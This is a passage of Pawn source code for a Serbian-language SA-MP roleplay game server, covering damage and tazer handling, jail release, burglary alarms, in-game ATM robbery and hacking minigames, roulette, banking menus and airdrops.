    if( issuerid != INVALID_PLAYER_ID && issuerid != INVALID_PLAYER_ID && amount == 0 && weapon == 0 && bodypart == 3 ) {
        format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Command kill", ImeIgraca( issuerid ) );
        AdminPoruka( SVETLOCRVENA, globalstring );
        Kickovanje( issuerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Command kill");
        return 0;
    }

    new Float:HPIgraca;
    GetPlayerHealth(playerid, HPIgraca);
    if(issuerid != INVALID_PLAYER_ID && HPIgraca >= 40.0 && !igracKrvari[playerid]) {

        new sansa = RandomNew(1, 5);
        if(sansa == 4) {

            igracKrvari[playerid] = true;
            krvarenjeCount[playerid] = 0;
            defer krvarenjeIgraca(playerid);
            defer krvarenjeTDFlash(playerid);

            return 1;
        }
    }

    if(issuerid != INVALID_PLAYER_ID && weapon == 30) {

        Novi_SetPlayerHealth(playerid, HPIgraca-5);
    }

    // if(issuerid != INVALID_PLAYER_ID && weapon == 34 && bodypart == 9)
    // {
    //     Novi_SetPlayerHealth(playerid, 0.0);
    // }
    
    if( issuerid != INVALID_PLAYER_ID  ) {
        if( OI[ PlayerInfo[ issuerid ][ xClan ] ][ oTip ] == ORG_TIP_PD && !IsPlayerInAnyVehicle( issuerid ) && !IsPlayerInAnyVehicle( playerid ) && GetWeapon( issuerid ) == 23 && ImaTazer[ issuerid ] == true && !AdminDuty[ playerid ] ) {
            if( GetFactionType( playerid ) == ORG_TIP_PD ) return SCM( issuerid, CRVENA, "Ne mozes tazovati PD!" );

            new Float:Pos[ 3 ];
            GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
            if( IsPlayerInRangeOfPoint( issuerid, 10.0, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] ) ) {

                format( globalstring, sizeof( globalstring ), "%s puca tazerom na %s-a i pogadja ga.", ImeIgraca( issuerid ), ImeIgraca( playerid ) );
                PorukaRadius( 20.0, issuerid, globalstring, LJUBICASTA );
                TogglePlayerControllable( playerid, false );

                if( Maskuse[ playerid ] == true ) {
                    SetPlayerName( playerid, RealName[ playerid ] );
                    Maskuse[ playerid ] = false;
                }

                PlayerCuffed[ playerid ] = 1;
                Novi_SetPlayerHealth( playerid, 50 );
                SetPVarInt( playerid, "CuffTimerCalled", 1 );
                TazerTimer[ playerid ] = SetTimerEx("TazovanTajmer", 15000, false, "i", playerid );
                OnePlayAnim( playerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0 );
                return 0;
            }
        }
    }

    if(issuerid != INVALID_PLAYER_ID) {

        if( WARPInfo[ playerid ][ warID ] != -1 || WARPInfo[issuerid][warID] != -1) return 1;
        if(weapon != 0) {

            if( GetFactionType( playerid ) == ORG_TIP_PD && GetFactionType(issuerid) != ORG_TIP_PD)
            {
                if(PlayerInfo[issuerid][xWanted] == 10) return 1;
                PostaviWanted( issuerid, "Napad na policajca", "Nepoznat", 10 );
                SendClientMessage( issuerid, SVETLOCRVENA, "WANTED | Dobio si wanted!Razlog: Napad na policajca");
                new String: string = str_format( "WANTED | %s je dobio wanted!Razlog: Napad na policajca", ImeIgraca(issuerid));

                foreach( Player, i ) {
                    if( IsPlayerConnected( i ) ) {
                        if( OI[ PlayerInfo[ i ][ xClan ] ][ oTip ] == ORG_TIP_PD ) {
                            pp_SCM( i, 0x8D8DFF00, string );
                        }
                    }
                }   
            }
        }
    }

    return 1;
}

//------------------------------------------------------------------------------


public TazovanTajmer( playerid ) {
	if( PlayerCuffed[ playerid ] == 1 ) {
	
		PlayerCuffed[ playerid ] = 0;
		SetPVarInt( playerid, "CuffTimerCalled", 0 );
		TogglePlayerControllable( playerid, true );
		GameTextForPlayer( playerid, "~y~Tazer zavrsen", 5000, 3 );
		ClearAnimations( playerid );
        Novi_KillTimer( TazerTimer[ playerid ] );
	}
	return 1;
}
//------------------------------------------------------------------------------
OtherCheck( playerid ) {
	if( PlayerInfo[ playerid ][ xZatvor ] > 0 ) {
	    if(PlayerInfo[ playerid ][ xZatvorVreme ] > 0 )
	        PlayerInfo[ playerid ][ xZatvorVreme ] -= 1;
	    else if( PlayerInfo[ playerid ][ xZatvorVreme ] <= 0 ) {
		    if( PlayerInfo[ playerid ][ xZatvor ] == OBICAN_ZATVOR ) {
		       
				Novi_SetPlayerPos( playerid, 1798.0217,-1578.1200,14.0855);
                SetPlayerWorldBounds( playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000 );
			    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
			   	SetCameraBehindPlayer( playerid );
			    TogglePlayerControllable( playerid, false );
			   	SetPlayerInterior( playerid, 0 );
				SetPlayerVirtualWorld( playerid, 0);
		    }
		    else if( PlayerInfo[ playerid ][ xZatvor ] == ALKATRAZ ) {
		        SetPlayerWorldBounds( playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000 );
			    SetPlayerInterior( playerid, 0 );
			    SetPlayerVirtualWorld( playerid, 0 );
			    Novi_SetPlayerPos( playerid, 1798.0217,-1578.1200,14.0855 );
		    }
		    PlayerInfo[ playerid ][ xZatvor ] = 0; PlayerInfo[ playerid ][ xZatvorVreme ] = 0;
		    SendInfoMessage( playerid, "Platili ste svoj dug drustvu." );
		    GameTextForPlayer( playerid, "~g~Sloboda~n~~w~Pokusajte biti bolji gradjanin", 5000, 1);
	    }
	}
}
//------------------------------------------------------------------------------
stock CrimInRange( Float:radi, playerid, copid ) {
	if( IsPlayerConnected( playerid ) && IsPlayerConnected( copid ) ) {
		new Float:posx,
		    Float:posy,
			Float:posz,
		    Float:oldposx,
			Float:oldposy,
			Float:oldposz,
		    Float:tempposx,
		    Float:tempposy;

		GetPlayerPos( playerid, oldposx, oldposy, oldposz);
		GetPlayerPos(copid, posx, posy, posz);

		tempposx = (oldposx -posx);
		tempposy = (oldposy -posy);

		if(((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)))
		{
			return 1;
		}
	}
	return 0;
}
//------------------------------------------------------------------------------
public Provala( playerid )
{
    for( new i = 1; i < MAX_IMOVINA; i++) {
		if( IsPlayerInRangeOfPoint( playerid, 2, II[  i][ iEnter ][ 0 ], II[  i][ iEnter ][ 1 ], II[  i][ iEnter ][ 2 ] ) ) {
		    if(GetPVarInt( playerid, "Pokusaj") == 1) {
		        if( II[ i ][ iAlarm ] == 1 ) {
		            format( globalstring, sizeof( globalstring ), "[%s ALARM] BEEP BEEP BEEP!!", II[ i ][ iAdress ] );
					PorukaRadius(60.0, playerid, globalstring, LJUBICASTA );
				}
				else if( II[ i ][ iAlarm ] == 2) {
				    foreach( Player, h ) {
						if( IsPlayerConnected( h ) ) {
				   			if( strcmp( ImeIgraca( h ), II[ i ][ iOwner ], true) == 0 ) {
				   			    SCM( h, ZUTA, "SMS: Netko vam je provalio bravu!Pozovite policiju, Vas Alarm!");
			   				}
						}
					}
				    format( globalstring, sizeof( globalstring ), "[%s ALARM] BEEP BEEP BEEP!!", II[ i ][ iAdress ] );
					PorukaRadius(60.0, playerid, globalstring, LJUBICASTA );
				}
				else if( II[ i ][ iAlarm ] >= 3)
				{
				    foreach( Player, h )
					{
						if( IsPlayerConnected( h ) )
						{
					   		if( strcmp( ImeIgraca( h ), II[ i ][ iOwner ], true) == 0 )
							{
					 		    SCM( h, ZUTA, "SMS: Netko vam pokusava provaliti u kucu, Vas Alarm!" );
				   			}
						}
					}
					for( new id = 1; id < MAX_ORG; id++) {
		    			if( OI[ id ][ oTip ] == ORG_TIP_PD ) {
							OrgPoruka( id, 0x2641FEAA, "HQ: Svim jedinicama: Prijavio: Tihi Alarm" );
							OrgPoruka( id, 0x2641FEAA, "HQ: Zlocin: Provala u kucu    ||  Osumljiceni: Nepoznat" );
							format( globalstring, sizeof( globalstring ), "HQ: Adresa kuce: %s", II[ i ][ iAdress ] );
							OrgPoruka( id, 0x2641FEAA, globalstring );
						    format( globalstring, sizeof( globalstring ), "[%s ALARM] BEEP BEEP BEEP!!", II[ i ][ iAdress ] );
							PorukaRadius(60.0, playerid, globalstring, LJUBICASTA );
						}
					}
				}
    			II[ i ][ iLocked ] = 0; Odbrojavanje[ playerid ] = 0;
    			VremeTDControl( playerid, false );
				SCM( playerid, SVETLOPLAVA, "Onesposobili ste bravu,sada mozete uci u kucu!");
				PlayerPlaySound( playerid, 1145, 0.0, 0.0, 0.0);
				TogglePlayerControllable( playerid, 1);
    			SetPVarInt( playerid, "Pokusaj", 0);
			}
		}
	}
	return 1;
}
//------------------------------------------------------------------------------ 
forward SaveSports( );
public SaveSports( ) {

	if( fexist( F_SPORT ) ) {
		fremove( F_SPORT );
	}

	new File:_h_handler = fopen( F_SPORT, io_append ), _s_str[256];

	for( new i = 0; i < MAX_SPORTS; i++) {
        format(_s_str, sizeof(_s_str), "%d,%d,%s,%f,%f,%f\r\n", supportInfo[ i ][ supportID ], supportInfo[ i ][ supportCreated ], supportInfo[ i ][ supportName ], supportInfo[ i ][ supportPos ][ 0 ], supportInfo[ i ][ supportPos ][ 1 ], supportInfo[ i ][ supportPos ][ 2 ] );
        fwrite(_h_handler, _s_str);
	}

	fclose(_h_handler);

	return 1;
}
forward LoadSports( );
public LoadSports( ) {

	if( fexist( F_SPORT ) ) {
		new File:_h_handler = fopen( F_SPORT, io_read ), _l_str[256], i = 0;
        new arrCoords[ 6 ][ 64 ];
		while( fread( _h_handler, _l_str ) ) {
			split( _l_str, arrCoords, ',' );
			supportInfo[ i ][ supportID ] = strval( arrCoords[ 0 ] );
			supportInfo[ i ][ supportCreated ] = strval( arrCoords[ 1 ] );
            strmid( supportInfo[ i ][ supportName ], arrCoords[ 2 ], 0, strlen( arrCoords[ 2 ] ), 255);
            supportInfo[ i ][ supportPos ][ 0 ] = floatstr( arrCoords[ 3 ] );
            supportInfo[ i ][ supportPos ][ 1 ] = floatstr( arrCoords[ 4 ] );
            supportInfo[ i ][ supportPos ][ 2 ] = floatstr( arrCoords[ 5 ] );

			i++;
		}

		fclose(_h_handler);
	}

	return 1;
}
//------------------------------------------------------------------------------ 
forward SaveAports( );
public SaveAports( ) {

	if( fexist( F_APORT ) ) {
		fremove( F_APORT );
	}

	new File:_h_handler = fopen( F_APORT, io_append ), _s_str[256];

	for( new i = 0; i < MAX_APORTS; i++) {
        format(_s_str, sizeof(_s_str), "%d,%d,%s,%f,%f,%f\r\n", aportInfo[ i ][ aportID ], aportInfo[ i ][ aportCreated ], aportInfo[ i ][ aportName ], aportInfo[ i ][ aportPos ][ 0 ], aportInfo[ i ][ aportPos ][ 1 ], aportInfo[ i ][ aportPos ][ 2 ] );
        fwrite(_h_handler, _s_str);
	}

	fclose(_h_handler);

	return 1;
}
forward LoadAports( );
public LoadAports( ) {

	if( fexist( F_APORT ) ) {
		new File:_h_handler = fopen( F_APORT, io_read ), _l_str[256], i = 0;
        new arrCoords[ 6 ][ 64 ];
		while( fread( _h_handler, _l_str ) ) {
			split( _l_str, arrCoords, ',' );
			aportInfo[ i ][ aportID ] = strval( arrCoords[ 0 ] );
			aportInfo[ i ][ aportCreated ] = strval( arrCoords[ 1 ] );
            strmid( aportInfo[ i ][ aportName ], arrCoords[ 2 ], 0, strlen( arrCoords[ 2 ] ), 255);
            aportInfo[ i ][ aportPos ][ 0 ] = floatstr( arrCoords[ 3 ] );
            aportInfo[ i ][ aportPos ][ 1 ] = floatstr( arrCoords[ 4 ] );
            aportInfo[ i ][ aportPos ][ 2 ] = floatstr( arrCoords[ 5 ] );
            
			i++;
		}

		fclose(_h_handler);
	}

	return 1;
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
forward RobZiceAtm( playerid );
public RobZiceAtm( playerid ) {

	if( playerid != IPI && PlayerLogged[ playerid ] && robbingATM[ playerid ] != -1 ) {
	
		if( robbingATM[ playerid ] == GetNearestAtm( playerid ) ) {

			new stringic[ 128 ];

			robbingATMSeconds[ playerid ]--;

		    format( stringic, sizeof( stringic ), "~w~Ostani pored ~r~bankomata ~w~dok~n~vreme ne istekne %d sec!", robbingATMSeconds[ playerid ] );
		    GameTextForPlayer( playerid, stringic, 1000, 4 );
	        
			if( robbingATMSeconds[ playerid ] == 0 ) {
			
			    Novi_KillTimer( atmrobTimer[ playerid ] );

			    new brojcina = random(14);

		        robbingATMSeconds[ playerid ] = 95;
				if( brojcina < 7 ) {
				    atmTDControl( playerid, false );
				    PostaviWanted( playerid, "Pokusaj pljacke bankomata", "Nepoznati", 3 );

				    atmInfo[ robbingATM[ playerid ] ][ atmVremeDoRoba ] = 60;
				    SacuvajATM( robbingATM[ playerid ] );
				    PlayerInfo[ playerid ][ xPljackaVreme ] = 60;
					    
				    SendInfoMessage( playerid, "Isekli ste pogresnu zicu i oglasili alarm." );
				}
				else if( brojcina >= 7 ) {
		
				    SelectTextDraw( playerid, SRVBOJA1 );

			     	atmInfo[ robbingATM[ playerid ] ][ atmPreseceneZice ] = true;
					SacuvajATM( robbingATM[ playerid ] );

				    SendInfoMessage( playerid, "Uspesno ste srusili odbrambeni sistem.");
					SendInfoMessage( playerid, "Sada mozete ukrasti novac iz bankomata.");
				}
			}
		}
		else {
		    atmTDControl( playerid, false );

		    Novi_KillTimer( atmrobTimer[ playerid ] );

		    PostaviWanted( playerid, "Pokusaj pljacke bankomata", "Nepoznati", 3 );
		    atmInfo[ robbingATM[ playerid ] ][ atmVremeDoRoba ] = 60;
		    SacuvajATM( robbingATM[ playerid ] );
		    PlayerInfo[ playerid ][ xPljackaVreme ] = 60;

		    robbingATM[ playerid ] = -1;
		    robbingATMSeconds[ playerid ] = 95;
		    SendInfoMessage( playerid, "Pomerili ste se od bankomata i probijanje istog je prekinuto." );
		}
	}
}
//------------------------------------------------------------------------------
forward ProgresAtmBar( playerid );
public ProgresAtmBar( playerid ) {
	if( robbingATM[ playerid ] == GetNearestAtm( playerid ) ) {
	    new Float:Value = GetPlayerProgressBarValue( playerid, playeratmBar[ playerid ] );
	    if( Value != 100 ) {
			SetPlayerProgressBarValue( playerid, playeratmBar[ playerid ], Value+1 );

			new stringic[ 5 ];
	    	format( stringic, sizeof( stringic ), "%d%", floatround( Value+1 ) );
	    	PlayerTextDrawSetString( playerid, atmrobLoading[ playerid ][ 1 ], stringic );

	    	atmrobTimer[ playerid ] = SetTimerEx( "ProgresAtmBar", 1000, false, "d", playerid );
		}
		else if( Value == 100 ) {
		    if( LaptopRuke[ playerid ] ) {
			    SelectTextDraw( playerid, SRVBOJA1 );
			    Novi_KillTimer( atmrobTimer[ playerid ] );
			    atmLoadingTDControl( playerid, false );

			    HidePlayerProgressBar(playerid, playeratmBar[ playerid ] );
			    DestroyPlayerProgressBar(playerid, playeratmBar[ playerid ] );
			    playeratmBar[ playerid ] = PlayerBar:INVALID_PLAYER_BAR_ID;

	            atmInfo[ robbingATM[ playerid ] ][ atmProbijenBios ] = true;
				SacuvajATM( robbingATM[ playerid ] );

			    SendInfoMessage( playerid, "Uspesno ste srusili odbrambeni sistem.");
				SendInfoMessage( playerid, "Sada mozete prebaciti novac na vas racun.");

				robbingATM[ playerid ] = -1;
			}
			else {
			    atmTDControl( playerid, false );

			    Novi_KillTimer( atmrobTimer[ playerid ] );
			    atmLoadingTDControl( playerid, false );

			    HidePlayerProgressBar(playerid, playeratmBar[ playerid ] );
			    DestroyPlayerProgressBar(playerid, playeratmBar[ playerid ] );
			    playeratmBar[ playerid ] = PlayerBar:INVALID_PLAYER_BAR_ID;

			    PostaviWanted( playerid, "Pokusaj pljacke bankomata", "Nepoznati", 3 );

			    atmInfo[ robbingATM[ playerid ] ][ atmVremeDoRoba ] = 60;
			    SacuvajATM( robbingATM[ playerid ] );
			    PlayerInfo[ playerid ][ xPljackaVreme ] = 60;

			    robbingATM[ playerid ] = -1;

			    SendInfoMessage( playerid, "Nemate laptop u rukama i prekunuta vam je pljacka." );
			}
		}
	}
	else { 
	    atmTDControl( playerid, false );
	    
	    Novi_KillTimer( atmrobTimer[ playerid ] );
	    atmLoadingTDControl( playerid, false );

	    HidePlayerProgressBar(playerid, playeratmBar[ playerid ] );
	    DestroyPlayerProgressBar(playerid, playeratmBar[ playerid ] );
	    playeratmBar[ playerid ] = PlayerBar:INVALID_PLAYER_BAR_ID;
	    
	    PostaviWanted( playerid, "Pokusaj pljacke bankomata", "Nepoznati", 3 );
	    
	    atmInfo[ robbingATM[ playerid ] ][ atmVremeDoRoba ] = 60;
	    SacuvajATM( robbingATM[ playerid ] );
	    PlayerInfo[ playerid ][ xPljackaVreme ] = 60;
	    
	    robbingATM[ playerid ] = -1;
	    
	    SendInfoMessage( playerid, "Pomerili ste se od bankomata i vase hakovanje istog je prekinuto." );
	}
}
public OnPlayerClickTextDraw(playerid, Text:clickedid)
{

    if(clickedid == Text:INVALID_TEXT_DRAW) {

        if(RouletteIgra[playerid]) {

            RouletteTDControl(playerid, false);
            return 1;
        }

        if(bankaTDShown[playerid]) {

            bankaTDControl(playerid, false);
            return 1;
        }
        if(OpenCaseShown[playerid]) {

            OpenCaseTDControl(playerid, false);
            return 1;
        }
        if(AirDropShown[playerid]) {

            AirDropTDControl(playerid, false);
            return 1;
        }
    }

    
    return 1;
}
//------------------------------------------------------------------------------
public OnPlayerClickPlayerTextDraw( playerid, PlayerText:playertextid ) {

    if( _:playertextid != INVALID_TEXT_DRAW ) {

        if(playertextid == RouletteTD[playerid][1]) {

            SendInfoMessage(playerid, "Ugasio si rulet!");

            RouletteTDControl(playerid, false);
            return 1;
        }

        if(playertextid == RouletteTD[playerid][83]) { //+

            if(RouletteUlog[playerid] >= 2000) return SendErrorMessage(playerid, "Ne mozes ici vise od 2.000$!");

            RouletteUlog[playerid] += 100;
            PlayerTextDrawHide(playerid, RouletteTD[playerid][81]);
            new string[64];
            format(string, sizeof(string), "Trenutni Ulog : %d$", RouletteUlog[playerid]);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][81], string);
            PlayerTextDrawShow(playerid, RouletteTD[playerid][81]);

            IzracunajDobitak(playerid);

            return 1;
        }

        if(playertextid == RouletteTD[playerid][84]) { //-

            if(RouletteUlog[playerid] <= 100) return SendErrorMessage(playerid, "Ne mozes ici ispod 100$!");

            RouletteUlog[playerid] -= 100;
            PlayerTextDrawHide(playerid, RouletteTD[playerid][81]);
            new string[64];
            format(string, sizeof(string), "Trenutni Ulog : %d$", RouletteUlog[playerid]);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][81], string);
            PlayerTextDrawShow(playerid, RouletteTD[playerid][81]);

            IzracunajDobitak(playerid);

            return 1;
        }

        if(clickedRouletteNumber(playerid, playertextid)) {

            rouletteBroj(playerid, playertextid);
            return 1;
        }

        if(playertextid == RouletteTD[playerid][86]) { //Crvena

            RouletteOdabir[playerid] = 37;
            Roulette_PromeniOdabir(playerid);
            IzracunajDobitak(playerid);

            return 1;
        }

        if(playertextid == RouletteTD[playerid][87]) { //Crna

            RouletteOdabir[playerid] = 38;
            Roulette_PromeniOdabir(playerid);
            IzracunajDobitak(playerid);

            return 1;
        }

        if(playertextid == RouletteTD[playerid][89]) { //Zelena

            RouletteOdabir[playerid] = 39;
            Roulette_PromeniOdabir(playerid);
            IzracunajDobitak(playerid);

            return 1;
        }

        if(playertextid == RouletteTD[playerid][94]) { //1st 12

            RouletteOdabir[playerid] = 40;
            Roulette_PromeniOdabir(playerid);
            IzracunajDobitak(playerid);

            return 1;
        }

        if(playertextid == RouletteTD[playerid][95]) { //2nd 12

            RouletteOdabir[playerid] = 41;
            Roulette_PromeniOdabir(playerid);
            IzracunajDobitak(playerid);

            return 1;
        }

        if(playertextid == RouletteTD[playerid][96]) { //3rd 12

            RouletteOdabir[playerid] = 42;
            Roulette_PromeniOdabir(playerid);
            IzracunajDobitak(playerid);

            return 1;
        }

        if(playertextid == RouletteTD[playerid][97]) { //1-18

            RouletteOdabir[playerid] = 43;
            Roulette_PromeniOdabir(playerid);
            IzracunajDobitak(playerid);

            return 1;
        }

        if(playertextid == RouletteTD[playerid][99]) { //19-36

            RouletteOdabir[playerid] = 44;
            Roulette_PromeniOdabir(playerid);
            IzracunajDobitak(playerid);

            return 1;
        }

        if(playertextid == RouletteTD[playerid][85]) { //Zavrti

            ZavrtiRulet(playerid);
            new dobija = RouletteUlog[playerid] / 2;
            if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ] , dobija );

            return 1;
        }

        if(playertextid == ElektricarTD[playerid][3]) {

            PlayerTextDrawHide(playerid, ElektricarTD[playerid][3]);
            radiElektricar[playerid]++;

            SendJobMessage(playerid, "Nastavi dalje!");

            if(radiElektricar[playerid] == 5) {

                SendJobMessage(playerid, "Sada skini maticnu plocu!");
            }

            if(radiElektricar[playerid] == 10) {

                elektricarTDShow(playerid, false);
                DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1999.0894,-2015.2059,13.5750, 2.0);

                SendJobMessage(playerid, "Vrati se nazad da bi dobio platu!");
            }

            return 1;
        }

        if(playertextid == ElektricarTD[playerid][4]) {

            PlayerTextDrawHide(playerid, ElektricarTD[playerid][4]);
            radiElektricar[playerid]++;

            SendJobMessage(playerid, "Nastavi dalje!");

            if(radiElektricar[playerid] == 5) {

                SendJobMessage(playerid, "Sada skini maticnu plocu!");
            }

            if(radiElektricar[playerid] == 10) {

                elektricarTDShow(playerid, false);
                DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1999.0894,-2015.2059,13.5750, 2.0);

                SendJobMessage(playerid, "Vrati se nazad da bi dobio platu!");
            }

            return 1;
        }

        if(playertextid == ElektricarTD[playerid][5]) {

            PlayerTextDrawHide(playerid, ElektricarTD[playerid][5]);
            radiElektricar[playerid]++;

            SendJobMessage(playerid, "Nastavi dalje!");

            if(radiElektricar[playerid] == 5) {

                SendJobMessage(playerid, "Sada skini maticnu plocu!");
            }

            if(radiElektricar[playerid] == 10) {

                elektricarTDShow(playerid, false);
                DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1999.0894,-2015.2059,13.5750, 2.0);

                SendJobMessage(playerid, "Vrati se nazad da bi dobio platu!");
            }

            return 1;
        }

        if(playertextid == ElektricarTD[playerid][6]) {

            PlayerTextDrawHide(playerid, ElektricarTD[playerid][6]);
            radiElektricar[playerid]++;

            SendJobMessage(playerid, "Nastavi dalje!");

            if(radiElektricar[playerid] == 5) {

                SendJobMessage(playerid, "Sada skini maticnu plocu!");
            }

            if(radiElektricar[playerid] == 10) {

                elektricarTDShow(playerid, false);
                DisablePlayerCheckpoint(playerid);
                Novi_SetPlayerCheckpoint(playerid, 1999.0894,-2015.2059,13.5750, 2.0);

                SendJobMessage(playerid, "Vrati se nazad da bi dobio platu!");
            }

            return 1;
        }

        if(playertextid == ElektricarTD[playerid][1] && radiElektricar[playerid] == 5) {

            PlayerTextDrawHide(playerid, ElektricarTD[playerid][1]);
            radiElektricar[playerid]++;

            SendJobMessage(playerid, "Sada zasavi novu maticnu plocu");

            elektricarTDShow(playerid, false);
            elektricarTDShow(playerid, true);

            return 1;
        }

        if(playertextid == BankaTD[playerid][9]) {

            bankaTDControl(playerid, false);

            if( PlayerInfo[ playerid ][ xImaBRacun ] ) return SendErrorMessage( playerid, "Vec imas otvoren racun u banci." );
            if( !IsPlayerInRangeOfPoint( playerid, 2.0, BankaX, BankaY, BankaZ ) ) return SendErrorMessage( playerid, "Morate biti u banci kod pickupa." );
            
            PlayerInfo[ playerid ][ xImaBRacun ] = true;
            SavePlayer( playerid );
            UpdateBankTD( playerid );
            bankaTDControl(playerid, true);
            SendInfoMessage( playerid, "Uspesno ste otvorili racun u banci." );
            SendInfoMessage( playerid, "Uz otvoren racun dobili ste i karticu za bankomat." );

            return 1;
        }

        if(playertextid == BankaTD[playerid][10]) {

            ShowPlayerDialog(playerid, dialog_Withdraw, DIALOG_STYLE_INPUT, "Withdraw", "Unesite sumu novca koju podizete", "Potvrdi", "Odustani");

            return 1;
        }

        if(playertextid == BankaTD[playerid][11]) {

            ShowPlayerDialog(playerid, dialog_Deposit, DIALOG_STYLE_INPUT, "Deposit", "Unesite sumu novca koju ostavljate", "Potvrdi", "Odustani");

            return 1;
        }

        if(playertextid == BankaTD[playerid][12]) {

            ShowPlayerDialog(playerid, dialog_Transfer, DIALOG_STYLE_INPUT, "Transfer", "Unesite sumu novca koju saljete i ID igraca", "Potvrdi", "Odustani");

            return 1;
        }

        if(playertextid == BankaTD[playerid][13]) {

            if( !PlayerInfo[ playerid ][ xImaBRacun ] ) return SendErrorMessage( playerid, "Prvo moras da otvoris racun u banci." );
            SPD( playerid, dialog_KREDIT, DSL, D_NASLOV, "Kredit - 20000$ (Level 5)\nKredit - 50000$ (Level 10)\nKredit - 80000$ (Level 15)\nKredit - 100000$ (Level 20)", D_ODABERI, D_ODUSTANI );

            return 1;
        }

        if(playertextid == BankaTD[playerid][14]) {

            if( !PlayerInfo[ playerid ][ xImaBRacun ] ) return SendErrorMessage( playerid, "Prvo moras da otvoris racun u banci." );
            if( PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] == 0 ) return SendErrorMessage( playerid, "Nemate podignut kredit!");
            SPD( playerid, dialog_INFOKREDIT, DSL, D_NASLOV, "Info Kredit\nPromena Iznosa Rate\nOtplati ceo kredit", D_ODABERI, D_ODUSTANI );

            return 1;
        }

        if(playertextid == BankaTD[playerid][15]) {

            bankaTDControl(playerid, false);

            return 1;
        }

        if(playertextid == AirDropTD[playerid][6]) {

            if(airdropActive[playerid]) return SendErrorMessage(playerid, "Ne mozes to sada!");
            if( GetPlayerState(playerid) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Moras biti na nogama da bi pozvao airdrop!");
            
            if(WARPInfo[ playerid ][ warID ] != -1) return SendErrorMessage(playerid, "Ne mozes to dok si u War-u!");
            if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na DM Zoni." );
            if(radiMisiju[playerid] != 0) return SendErrorMessage(playerid, "Ne mozes to dok radis misiju!");

            if(GetPlayerMoney(playerid) < 10000) return SendErrorMessage(playerid, "Nemas dovoljno novca! (10.000$)");

            new f = -1;
            for( new a = 0; a < MAX_AIRDROPS; a++ ) {
                if( airdropData[ a ][ airPosition ][ 0 ] == 0.0 ) {
                    f = a;
                    break;
                }
            }
            if( f == -1 ) return SendErrorMessage( playerid, "Trenutno ne mozes zakazati airdrop." );

            createAirDrop(playerid, f, 1);

            AirDropTDControl(playerid, false);

            DajIgracuNovac(playerid, -10000);

            airdropActive[playerid] = true;

            defer airDropCallTimer(playerid);

            SendInfoMessage(playerid, "Pozvao si AirDrop za 10.000$! Sacekaj da padne!");

            if(PlayerInfo[playerid][xAchivements][13] == 0) {

                achivementPassed(playerid, 13, 6000);
            }

            return 1;
        }

        if(playertextid == AirDropTD[playerid][7]) {

            if(airdropActive[playerid]) return SendErrorMessage(playerid, "Ne mozes to sada!");
            if( GetPlayerState(playerid) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Moras biti na nogama da bi pozvao airdrop!");

            if(WARPInfo[ playerid ][ warID ] != -1) return SendErrorMessage(playerid, "Ne mozes to dok si u War-u!");
            if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na DM Zoni." );
            if(radiMisiju[playerid] != 0) return SendErrorMessage(playerid, "Ne mozes to dok radis misiju!");

            if(GetPlayerMoney(playerid) < 10000) return SendErrorMessage(playerid, "Nemas dovoljno novca! (10.000$)");

            new f = -1;
            for( new a = 0; a < MAX_AIRDROPS; a++ ) {
                if( airdropData[ a ][ airPosition ][ 0 ] == 0.0 ) {
                    f = a;
                    break;
                }
            }
            if( f == -1 ) return SendErrorMessage( playerid, "Trenutno ne mozes zakazati airdrop." );

            createAirDrop(playerid, f, 2);

            AirDropTDControl(playerid, false);

            DajIgracuNovac(playerid, -10000);

            airdropActive[playerid] = true;

            defer airDropCallTimer(playerid);

            SendInfoMessage(playerid, "Pozvao si AirDrop za 10.000$! Sacekaj da padne!");

            if(PlayerInfo[playerid][xAchivements][13] == 0) {

                achivementPassed(playerid, 13, 6000);
            }

            return 1;
        }

        if(playertextid == AirDropTD[playerid][8]) {

            if(airdropActive[playerid]) return SendErrorMessage(playerid, "Ne mozes to sada!");
            if( GetPlayerState(playerid) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Moras biti na nogama da bi pozvao airdrop!");

            if(WARPInfo[ playerid ][ warID ] != -1) return SendErrorMessage(playerid, "Ne mozes to dok si u War-u!");
            if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na DM Zoni." );
            if(radiMisiju[playerid] != 0) return SendErrorMessage(playerid, "Ne mozes to dok radis misiju!");

            if(GetPlayerMoney(playerid) < 10000) return SendErrorMessage(playerid, "Nemas dovoljno novca! (10.000$)");

            new f = -1;
            for( new a = 0; a < MAX_AIRDROPS; a++ ) {
                if( airdropData[ a ][ airPosition ][ 0 ] == 0.0 ) {
                    f = a;
                    break;
                }
            }
            if( f == -1 ) return SendErrorMessage( playerid, "Trenutno ne mozes zakazati airdrop." );

            AirDropTDControl(playerid, false);

            createAirDrop(playerid, f, 3);

            DajIgracuNovac(playerid, -10000);

            airdropActive[playerid] = true;

            defer airDropCallTimer(playerid);

            SendInfoMessage(playerid, "Pozvao si AirDrop za 10.000$! Sacekaj da padne!");

            if(PlayerInfo[playerid][xAchivements][13] == 0) {

                achivementPassed(playerid, 13, 6000);
            }

            return 1;
        }

        if(playertextid == AirDropTD[playerid][2]) {

            AirDropTDControl(playerid, false);

            return 1;
        }

        if(playertextid == HackingTD[playerid][20]) {

            if(playerHacking[playerid] == 14) {

